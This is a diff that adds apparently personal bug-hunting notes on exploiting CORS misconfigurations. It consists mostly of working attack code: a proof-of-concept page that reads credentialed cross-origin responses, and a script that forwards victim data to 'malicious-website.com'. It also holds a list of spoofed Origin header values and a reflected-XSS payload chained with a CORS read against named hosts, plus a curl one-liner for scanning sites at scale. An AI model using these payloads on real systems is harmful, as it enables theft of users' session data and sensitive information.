@@ -1,0 +1,83 @@
+<!DOCTYPE html> 
+<html> 
+<body> 
+<center> 
+<h2>CORS POC Exploit</h2>
+<div id="demo"> 
+<button type="button" onclick="cors()">Exploit</button>
+ </div>  
+<script> function cors() { 
+  var xhttp = new XMLHttpRequest(); 
+  xhttp.onreadystatechange = function()
+  {     
+    if (this.readyState == 4 && this.status == 200) { 
+      document.getElementById("demo").innerHTML =alert(this.responseText);
+     }   
+    };  
+   xhttp.open("GET", "https://xyz.private.com", true);  
+   xhttp.withCredentials = true;  
+   xhttp.send(); 
+}
+</script> 
+</body> 
+</html>
+---------------------------------------------------------------------------
+https://infosecwriteups.com/stealing-chat-session-id-with-cors-and-execute-csrf-attack-f9f7ea229db1
+---------------------------------------------------------------------------
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='//malicious-website.com/log?key='+this.responseText;
+};
+The above exploit sends the received private key to the attacker’s website who can gain access to all user’s sensitive information.
+----------------------------------------------------------------------------
+
+
+    Origin:null
+    Origin:attacker.com
+    Origin:attacker.target.com
+    Origin:attackertarget.com
+    Origin:sub.attackertarget.com
+    Origin:attacker.com and then change the method Get to post/Post to Get
+    Origin:sub.attacker target.com
+    Origin:sub.attacker%target.com
+    Origin:attacker.com/target.com
+
+
+------------CORS-------------------------------------------
+
+
+https://banques.redacted.com/choice-quiz?form_banque="><script>alert(document.domain)</script>&form_cartes=73&iframestat=1   (firstly try xss)
+
+function cors() {  
+var xhttp = new XMLHttpRequest();  
+xhttp.onreadystatechange = function() {    
+    if (this.status == 200) {    
+    alert(this.responseText);     
+    document.getElementById("demo").innerHTML = this.responseText;    
+    }  
+};  
+xhttp.open("GET", "https://www.redacted.com/api/return", true);  
+xhttp.withCredentials = true;  
+xhttp.send();
+}
+cors();
+
+
+now put the code in xss payload endpoint like ----
+
+https://banques.redacted.com/choice-quiz?form_banque="><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://dot-a.geo2.op-mobile.opera.com/api/",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>&form_cartes=73&iframestat=1
+---------------------------------------------------
+
+https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397
+
+https://medium.com/@nipunthathsara/cross-origin-resource-sharing-cors-in-depth-68951a3cbf1a
+https://medium.com/techiepedia/what-are-sop-cors-and-ways-to-exploit-it-62a5e02100dc
+https://blog.witcoat.com/2018/05/30/stealing-10000-yahoo-cookies/
+
+CORS Misconfigs at scale 🔥🔥🔥🔥
+ gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS] echo $url; else echo Nothing "$url"; fi; done
